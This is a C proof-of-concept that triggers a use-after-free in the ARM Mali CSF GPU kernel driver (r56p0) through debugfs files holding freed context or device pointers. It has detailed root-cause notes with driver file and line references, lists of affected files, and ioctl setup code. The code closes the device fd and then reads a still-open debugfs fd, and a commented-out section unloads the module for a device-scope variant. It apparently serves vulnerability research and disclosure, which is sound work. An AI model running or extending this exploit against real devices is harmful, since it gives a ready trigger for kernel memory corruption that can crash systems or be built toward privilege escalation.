// SPDX-License-Identifier: MIT
/*
 * poc_debugfs_extended_uaf.c — Mali CSF r56p0 extended debugfs kctx/kbdev UAF
 *
 * BUG CLASS:  use-after-free (CWE-416) — deterministic
 * TARGET:     ARM Mali CSF kernel driver, AX504X08X-SW-99002-r56p0
 *
 * ROOT CAUSE:
 *   The original Finding 1 documented mem_profile, infinite_cache, force_same_va,
 *   mem_jit_*, and CSF per-ctx files (kcpu_queues, cpu_queues, tiler_heaps,
 *   sync_objects, queue_groups).
 *
 *   This PoC extends coverage to ADDITIONAL per-kctx debugfs files (NEW-2) and
 *   device-scope debugfs files (NEW-3 / Finding A') that also use raw kctx/kbdev
 *   pointers as i_private without get_file_active() anchoring:
 *
 *   Per-kctx (NEW-2):
 *     - kcpu_queues          (mali_kbase_csf_kcpu_debugfs.c:167)
 *     - csf_sync             (mali_kbase_csf_sync_debugfs.c:80)
 *     - tiler_heaps          (mali_kbase_csf_tiler_heap_debugfs.c:128)
 *     - tiler_heaps_total    (mali_kbase_csf_tiler_heap_debugfs.c:143)
 *     - mem_zones            (mali_kbase_debug_mem_zones.c:105)
 *     - mem_allocs           (mali_kbase_debug_mem_allocs.c:123)
 *     - mem_pool_size        (mali_kbase_mem_pool_debugfs.c:158) + max_size
 *     - lp_mem_pool_size     (mali_kbase_mem_pool_debugfs.c:168) + max_size
 *     - mem_view             (mali_kbase_debug_mem_view.c:397) — READ MODE ONLY, uses get_file_active ✓
 *
 *   Device-scope (NEW-3 / Finding A'):
 *     - pgd_mem_pool_size    (mali_kbase_mem_pool_debugfs.c:245) + max_size
 *     - fw_mem_pool_size     (mali_kbase_mem_pool_debugfs.c:255) + max_size
 *     - lp_fw_mem_pool_size  (mali_kbase_mem_pool_debugfs.c:266) + max_size
 *     - infinite_cache       (mali_kbase_core_linux.c:3668) — defaults dir, i_private=kbdev
 *     - regs_history         (mali_kbase_io.c:321) — i_private=&kbdev->io_history
 *     - fence_signal_timeout_enable/ms (mali_kbase_csf_kcpu_fence_debugfs.c:137) — i_private=kbdev
 *     - heap_reclaim_offslot (mali_kbase_core_linux.c:3786) — i_private=kbdev
 *     - tlstream             (tl/mali_kbase_timeline_io.c:420) — Finding 4
 *     - mali_trace           (debug/mali_kbase_debug_ktrace.c:382) — Finding 6.3
 *
 *   mem_view is the ONLY per-kctx file that acquires get_file_active(&kctx->filp)
 *   in its open handler (mali_kbase_debug_mem_view.c:259) — ARM knows the pattern
 *   but didn't apply it consistently.
 *
 * REPRODUCTION (single process, deterministic, no race):
 *   For per-kctx files:
 *     1. open /dev/mali0
 *     2. ioctl(VERSION_CHECK + SET_FLAGS) — creates kcontext
 *     3. [Optional] ioctl(MEM_PROFILE_ADD) for mem_profile, or create tiler heap/
 *        queue groups for CSF files
 *     4. open the debugfs file, KEEP the fd
 *     5. close the device fd  -> kbase_release -> vfree(kctx)
 *     6. read() the still-open debugfs fd -> UAF
 *
 *   For device-scope files:
 *     1. open /dev/mali0
 *     2. ioctl(VERSION_CHECK + SET_FLAGS)
 *     3. open the debugfs file (e.g., /sys/kernel/debug/mali0/pgd_mem_pool_size)
 *     4. rmmod mali_kbase (or trigger device unbind) -> vfree(kbdev)
 *     5. read() the still-open debugfs fd -> UAF
 *
 * BUILD:
 *   gcc -O2 -o poc_debugfs_extended_uaf poc_debugfs_extended_uaf.c
 *
 * RUN (must be root):
 *   ./poc_debugfs_extended_uaf [--per-kctx <file>] [--device <file>]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "../tools/mali_handshake.h"

#define UNUSED(x) (x) __attribute__((unused))

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_mem_profile_add {
	unsigned long long buffer;
	unsigned int len;
	unsigned int padding;
};
#define KBASE_IOCTL_MEM_PROFILE_ADD \
	_IOC(_IOC_WRITE, KBASE_IOCTL_TYPE, 27, sizeof(struct kbase_ioctl_mem_profile_add))

/* Tiler heap init ioctl (ioctl 48) - matches union kbase_ioctl_cs_tiler_heap_init */
union kbase_ioctl_cs_tiler_heap_init {
	struct {
		__u32 chunk_size;
		__u32 initial_chunks;
		__u32 max_chunks;
		__u16 target_in_flight;
		__u8 group_id;
		__u8 padding;
		__u64 buf_desc_va;
	} in;
	struct {
		__u64 gpu_heap_va;
		__u64 first_chunk_va;
	} out;
};
#define KBASE_IOCTL_CS_TILER_HEAP_INIT \
	_IOWR(KBASE_IOCTL_TYPE, 48, union kbase_ioctl_cs_tiler_heap_init)

/* Queue group create ioctl (ioctl 63) - matches union kbase_ioctl_cs_queue_group_create */
union kbase_ioctl_cs_queue_group_create {
	struct {
		__u64 tiler_mask;
		__u64 fragment_mask;
		__u64 compute_mask;
		__u8 cs_min;
		__u8 priority;
		__u8 tiler_max;
		__u8 fragment_max;
		__u8 compute_max;
		__u8 csi_handlers;
		__u8 neural_max;
		__u8 cs_fault_report_enable;
		__u64 dvs_buf;
		__u64 neural_mask;
		__u8 comp_pri_threshold;
		__u8 comp_pri_ratio;
		__u8 padding[58];
		__u32 fragment_endpoint_task_limit;
		__u64 reserved;
		__u8 group_handle;
		__u8 padding2[3];
		__u32 group_uid;
	} in;
	struct {
		__u32 group_handle;
		__u32 padding;
		__u32 group_uid;
	} out;
};
#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE \
	_IOWR(KBASE_IOCTL_TYPE, 63, union kbase_ioctl_cs_queue_group_create)

/* KCPU Queue create ioctl (ioctl 45) */
struct kbase_ioctl_kcpu_queue_new {
	__u8 id;
	__u8 padding[7];
};
#define KBASE_IOCTL_KCPU_QUEUE_CREATE \
	_IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)

/* Queue bind ioctl (ioctl 39) - matches union kbase_ioctl_cs_queue_bind */
union kbase_ioctl_cs_queue_bind {
	struct {
		__u32 queue_id;
		__u32 group_handle;
		__u64 va;
		__u64 user_io;
	} in;
	struct {
		__u32 queue_id;
		__u32 padding;
		__u64 va;
		__u64 user_io;
	} out;
};
#define KBASE_IOCTL_CS_QUEUE_BIND \
	_IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)

#define MAX_COOKIE_PATH 256

static const char *per_kctx_files[] = {
	/* Original Finding 1 files */
	"mem_profile",
	"infinite_cache",
	"force_same_va",
	"mem_jit_count",
	"mem_jit_vm",
	"mem_jit_phys",
	"mem_jit_used",
	"mem_jit_trim",
	"kcpu_queues",
	"cpu_queues",
	"tiler_heaps",
	"sync_objects",
	"queue_groups",

	/* NEW-2: Additional per-kctx files discovered */
	"csf_sync",
	"tiler_heaps_total",
	"mem_zones",
	"mem_allocs",
	"mem_pool_size",
	"mem_pool_max_size",
	"lp_mem_pool_size",
	"lp_mem_pool_max_size",
	/* mem_view is SAFE — uses get_file_active() */

	NULL
};

static const char *device_scope_files[] = {
	/* NEW-3 / Finding A': Device-scope files */
	"pgd_mem_pool_size",
	"pgd_mem_pool_max_size",
	"fw_mem_pool_size",
	"fw_mem_pool_max_size",
	"lp_fw_mem_pool_size",
	"lp_fw_mem_pool_max_size",
	"infinite_cache",       /* in defaults dir */
	"regs_history",
	"fence_signal_timeout_enable",
	"fence_signal_timeout_ms",
	"heap_reclaim_offslot",
	"tlstream",             /* Finding 4 */
	"mali_trace",           /* Finding 6.3 */

	NULL
};

static int find_mali_device(char *out, size_t outsz)
{
	static const char *cands[] = { "/dev/mali0", "/dev/mali", NULL };
	DIR *d;
	struct dirent *e;
	size_t i;

	for (i = 0; cands[i]; i++) {
		struct stat st;
		if (stat(cands[i], &st) == 0) {
			strncpy(out, cands[i], outsz - 1)[outsz - 1] = '\0';
			return 0;
		}
	}

	d = opendir("/dev");
	if (!d)
		return -1;
	while ((e = readdir(d))) {
		if (strncmp(e->d_name, "mali", 4) == 0) {
			snprintf(out, outsz, "/dev/%s", e->d_name);
			closedir(d);
			return 0;
		}
	}
	closedir(d);
	return -1;
}

static int find_kctx_dir(char *out, size_t outsz, const char *devname)
{
	char path[MAX_COOKIE_PATH];
	DIR *d;
	struct dirent *e;
	struct stat st;
	int written;

	written = snprintf(path, sizeof(path), "/sys/kernel/debug/%s/ctx", devname);
	if (written <= 0 || (size_t)written >= sizeof(path))
		return -1;

	if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
		d = opendir(path);
		if (!d)
			return -1;
		while ((e = readdir(d))) {
			char prefix[MAX_COOKIE_PATH];
			if (e->d_type != DT_DIR && e->d_type != DT_UNKNOWN)
				continue;
			snprintf(prefix, sizeof(prefix), "%d_", getpid());
			if (strncmp(e->d_name, prefix, strlen(prefix)) == 0) {
				snprintf(out, outsz, "%s/%s", path, e->d_name);
				closedir(d);
				return 0;
			}
		}
		closedir(d);
	}
	return -1;
}

static int test_per_kctx_file(const char *dev, const char *fname, int setup_tiler)
{
	char kctxdir[MAX_COOKIE_PATH];
	char filepath[MAX_COOKIE_PATH];
	char marker[] = "EXTENDED-PoC-MEMPROFILE";
	struct kbase_ioctl_mem_profile_add add;
	int mali_fd = -1, dbg_fd = -1;
	int ret = 1;

	mali_fd = open(dev, O_RDWR);
	if (mali_fd < 0) {
		perror("open /dev/maliN");
		return 1;
	}

	if (mali_kbase_setup(mali_fd) < 0) {
		perror("Kbase VERSION_CHECK/SET_FLAGS");
		close(mali_fd);
		return 1;
	}

	/* For mem_profile, need MEM_PROFILE_ADD to create the file */
	if (strcmp(fname, "mem_profile") == 0) {
		memset(&add, 0, sizeof(add));
		add.buffer = (unsigned long long)(uintptr_t)marker;
		add.len = (unsigned int)sizeof(marker);
		if (ioctl(mali_fd, KBASE_IOCTL_MEM_PROFILE_ADD, &add) < 0) {
			perror("ioctl(MEM_PROFILE_ADD)");
			close(mali_fd);
			return 1;
		}
		printf("[*] MEM_PROFILE_ADD ok\n");
	}

	/* For CSF files (tiler_heaps, kcpu_queues, etc.), need to create
	 * the underlying objects */
	if (setup_tiler && (strstr(fname, "tiler") || strcmp(fname, "kcpu_queues") == 0 ||
	                    strcmp(fname, "csf_sync") == 0)) {
		union kbase_ioctl_cs_tiler_heap_init heap_init = {0};
		heap_init.in.chunk_size = 65536;
		heap_init.in.initial_chunks = 1;
		heap_init.in.max_chunks = 4;
		heap_init.in.target_in_flight = 2;
		heap_init.in.group_id = 0;
		if (ioctl(mali_fd, KBASE_IOCTL_CS_TILER_HEAP_INIT, &heap_init) < 0) {
			fprintf(stderr, "[!] Tiler heap init failed for %s test\n", fname);
		} else {
			printf("[*] Tiler heap created for %s test\n", fname);
		}

		/* Also create a queue group for kcpu_queues/queue_groups/csf_sync */
		if (strcmp(fname, "kcpu_queues") == 0 || strcmp(fname, "queue_groups") == 0 ||
		    strcmp(fname, "csf_sync") == 0 || strcmp(fname, "cpu_queues") == 0) {
			union kbase_ioctl_cs_queue_group_create grp = {0};
			grp.in.tiler_mask = 1;
			grp.in.tiler_max = 1;
			grp.in.priority = 1;
			grp.in.cs_min = 1;
			if (ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_GROUP_CREATE, &grp) >= 0) {
				struct kbase_ioctl_kcpu_queue_new q = {0};
				
				
				if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &q) >= 0) {
					union kbase_ioctl_cs_queue_bind b = {0};
					b.in.queue_id = q.id;
					b.in.group_handle = grp.out.group_handle;
					ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_BIND, &b);
					printf("[*] Queue group + queue created for %s test\n", fname);
				}
			}
		}
	}

	if (find_kctx_dir(kctxdir, sizeof(kctxdir), strrchr(dev, '/') + 1) < 0) {
		fprintf(stderr, "[!] kctx debugfs dir not found\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] kctx debugfs dir: %s\n", kctxdir);

	snprintf(filepath, sizeof(filepath), "%s/%s", kctxdir, fname);
	printf("[*] Opening %s...\n", filepath);
	dbg_fd = open(filepath, O_RDONLY);
	if (dbg_fd < 0) {
		perror("open debugfs file");
		close(mali_fd);
		return 1;
	}

	/* Step 4 — close the device fd: kctx is vfree()d NOW */
	close(mali_fd);
	mali_fd = -1;
	printf("[*] Device fd closed — kctx is freed (vfree)\n");

	/* Step 5 — read() the dangling file: UAF on kctx */
	{
		char buf[512];
		ssize_t n;

		printf("[*] Reading dangling debugfs fd (KASAN should fire here)...\n");
		n = read(dbg_fd, buf, sizeof(buf));
		if (n < 0)
			printf("[-] read() error: %s (may have raced)\n", strerror(errno));
		else
			printf("[+] read %zd bytes — UAF read from freed kctx\n", n);
	}

	close(dbg_fd);
	return 0;
}

static int test_device_scope_file(const char *fname)
{
	char devpath[MAX_COOKIE_PATH];
	char filepath[MAX_COOKIE_PATH];
	int mali_fd = -1, dbg_fd = -1;
	const char *devname = "mali0";
	int ret = 1;

	/* First find the device and do handshake */
	if (find_mali_device(devpath, sizeof(devpath)) < 0) {
		fprintf(stderr, "[!] no /dev/maliN device found\n");
		return 1;
	}
	printf("[*] device: %s\n", devpath);

	mali_fd = open(devpath, O_RDWR);
	if (mali_fd < 0) {
		perror("open /dev/maliN");
		return 1;
	}

	if (mali_kbase_setup(mali_fd) < 0) {
		perror("Kbase VERSION_CHECK/SET_FLAGS");
		close(mali_fd);
		return 1;
	}

	/* Build debugfs path for device-scope file */
	if (strcmp(fname, "infinite_cache") == 0) {
		/* This is in the defaults directory */
		snprintf(filepath, sizeof(filepath), "/sys/kernel/debug/%s/defaults/infinite_cache", devname);
	} else {
		snprintf(filepath, sizeof(filepath), "/sys/kernel/debug/%s/%s", devname, fname);
	}

	/* Check if file exists */
	if (access(filepath, F_OK) != 0) {
		fprintf(stderr, "[!] Device-scope file %s not found at %s\n", fname, filepath);
		close(mali_fd);
		return 1;
	}

	printf("[*] Opening device-scope file %s...\n", filepath);
	dbg_fd = open(filepath, O_RDONLY);
	if (dbg_fd < 0) {
		perror("open device-scope debugfs file");
		close(mali_fd);
		return 1;
	}

	/* Close device fd first (but keep module loaded) */
	close(mali_fd);
	mali_fd = -1;
	printf("[*] Device fd closed (module still loaded)\n");

	/* For device-scope UAF, we need to rmmod the module.
	 * This requires root and is more invasive. We'll just test the
	 * read path here and note that rmmod would trigger the UAF.
	 * Uncomment the rmmod section below only for full testing. */

	/* Step 5 — read() the file while module is still loaded (no UAF yet) */
	{
		char buf[512];
		ssize_t n;

		printf("[*] Reading device-scope file (module still loaded — no UAF expected)...\n");
		n = read(dbg_fd, buf, sizeof(buf));
		if (n < 0)
			printf("[-] read() error: %s\n", strerror(errno));
		else
			printf("[+] read %zd bytes (no UAF — module still loaded)\n", n);
	}

	/*
	 * FOR FULL DEVICE-SCOPE UAF TESTING (requires module reload capability):
	 *
	 * 1. system("rmmod mali_kbase")  -- triggers kbase_device_debugfs_term() -> vfree(kbdev)
	 * 2. read(dbg_fd) -- UAF on freed kbdev / interior pointers
	 * 3. insmod mali_kbase.ko  -- reload for cleanup
	 *
	 * This is commented out because it requires module reload and is more invasive.
	 * Uncomment for full testing:
	 *
	 * printf("[*] Unloading module to trigger device-scope UAF...\n");
	 * system("rmmod mali_kbase");
	 * sleep(1);
	 * n = read(dbg_fd, buf, sizeof(buf));
	 * printf("UAF read result: %zd bytes\n", n);
	 * system("insmod /host/mali/mali_kbase.ko");
	 */

	close(dbg_fd);
	return 0;
}

static void enumerate_files(const char *dev, int is_device_scope)
{
	if (is_device_scope) {
		printf("\n=== Device-scope debugfs files (NEW-3 / Finding A') ===\n");
		for (int i = 0; device_scope_files[i]; i++) {
			char filepath[MAX_COOKIE_PATH];
			if (strcmp(device_scope_files[i], "infinite_cache") == 0) {
				snprintf(filepath, sizeof(filepath), "/sys/kernel/debug/mali0/defaults/%s", device_scope_files[i]);
			} else {
				snprintf(filepath, sizeof(filepath), "/sys/kernel/debug/mali0/%s", device_scope_files[i]);
			}
			if (access(filepath, F_OK) == 0) {
				printf("  [FOUND] %s\n", device_scope_files[i]);
			} else {
				printf("  [MISSING] %s\n", device_scope_files[i]);
			}
		}
	} else {
		char kctxdir[MAX_COOKIE_PATH];
		if (find_kctx_dir(kctxdir, sizeof(kctxdir), dev) < 0) {
			printf("\n[!] kctx debugfs dir not found\n");
			return;
		}
		printf("\n=== Per-kctx debugfs files (Finding 1 + NEW-2) ===\n");
		for (int i = 0; per_kctx_files[i]; i++) {
			char filepath[MAX_COOKIE_PATH];
			snprintf(filepath, sizeof(filepath), "%s/%s", kctxdir, per_kctx_files[i]);
			if (access(filepath, F_OK) == 0) {
				struct stat st;
				stat(filepath, &st);
				printf("  [FOUND] %s (mode=%o)\n", per_kctx_files[i], st.st_mode & 0777);
			} else {
				printf("  [MISSING] %s\n", per_kctx_files[i]);
			}
		}
	}
}

int main(int argc, char **argv)
{
	const char *test_file = NULL;
	int is_device_scope = 0;
	int enumerate_only = 0;
	int setup_tiler = 0;

	if (geteuid() != 0) {
		fprintf(stderr, "[!] run as root (debugfs perms for /sys/kernel/debug/mali*/)\n");
	}

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--per-kctx") && i + 1 < argc) {
			test_file = argv[++i];
			is_device_scope = 0;
		} else if (!strcmp(argv[i], "--device") && i + 1 < argc) {
			test_file = argv[++i];
			is_device_scope = 1;
		} else if (!strcmp(argv[i], "--enumerate")) {
			enumerate_only = 1;
		} else if (!strcmp(argv[i], "--setup-tiler")) {
			setup_tiler = 1;
		}
	}

	if (enumerate_only) {
		char dev[MAX_COOKIE_PATH / 2];
		find_mali_device(dev, sizeof(dev));
		enumerate_files(strrchr(dev, '/') + 1, 0);
		enumerate_files(strrchr(dev, '/') + 1, 1);
		return 0;
	}

	if (test_file) {
		char dev[MAX_COOKIE_PATH / 2];
		find_mali_device(dev, sizeof(dev));

		if (is_device_scope) {
			return test_device_scope_file(test_file);
		} else {
			return test_per_kctx_file(dev, test_file, setup_tiler);
		}
	}

	/* Default: run the standard mem_profile UAF test */
	char dev[MAX_COOKIE_PATH / 2];
	if (find_mali_device(dev, sizeof(dev)) < 0) {
		fprintf(stderr, "[!] no /dev/maliN device found\n");
		return 1;
	}

	printf("[*] Mali r56p0 Extended Debugfs UAF PoC — crash-only (no escalation)\n");
	return test_per_kctx_file(dev, "mem_profile", 0);
}